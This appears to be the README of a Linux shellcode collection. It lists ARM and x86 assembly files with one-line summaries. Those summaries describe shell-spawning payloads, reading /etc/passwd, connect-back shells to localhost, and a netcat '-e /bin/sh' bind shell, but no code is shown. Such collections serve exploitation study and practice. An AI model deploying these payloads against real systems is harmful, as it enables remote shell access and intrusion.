shellcodes-linux
================

Collection of Linux shellcodes


**arm_bash.asm**
execve("/bin/bash", ["/bin/bash", "-p"], NULL);

**arm_sh.asm**
execve("/bin/sh", ["/bin/sh"], NULL);

**x86_bash.asm**
execve("/bin/bash", ["/bin/bash"], NULL);

**x86_cat.asm**
execve("/bin/cat", ["/bin/cat", "key"], NULL);

**x86_cat_syscall.asm**
cat "/etc/passwd", with read()/write() syscalls

**x86_connectback.asm**
connect back to 127.0.0.1:4096 + execve "/bin/sh"

**x86_connectback_ipv6.asm**
connect back to [::1]:4096 + execve "/bin/sh"

**x86_hello.asm**
write(1, "Hello!!!\n" 9);

**x86_ls_syscall.asm**
list "." directory with getdents() syscall

**x86_nc.asm**
execve("/bin/nc", "/bin/nc", "-p", "4096", "-vve", "/bin/sh");